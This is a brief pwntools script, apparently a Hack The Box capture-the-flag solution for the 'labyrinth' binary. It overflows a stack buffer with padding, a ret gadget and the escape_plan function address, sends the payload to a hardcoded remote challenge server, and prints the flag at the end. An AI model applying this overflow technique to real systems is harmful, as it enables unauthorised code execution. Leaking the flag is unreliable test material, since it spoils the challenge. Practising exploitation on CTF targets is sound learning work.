#RazviOverflow
from pwn import *
'''
No pic, No Canary, Yes NX

fgets writes 0x44 from rbp-0x38
'''

context.binary = binary = ELF("./labyrinth", checksec=False)
escape_plan_address = p64(binary.symbols['escape_plan'])
ret_address = p64(0x401324)
p = remote("167.172.50.208", 30618)
p.sendline(b"69")
print(p.recvuntil(b"?"))
payload = b"A"*0x30 + b"B"*0x8 + ret_address + escape_plan_address
p.sendline(payload)
p.interactive()

# HTB{3sc4p3_fr0m_4b0v3}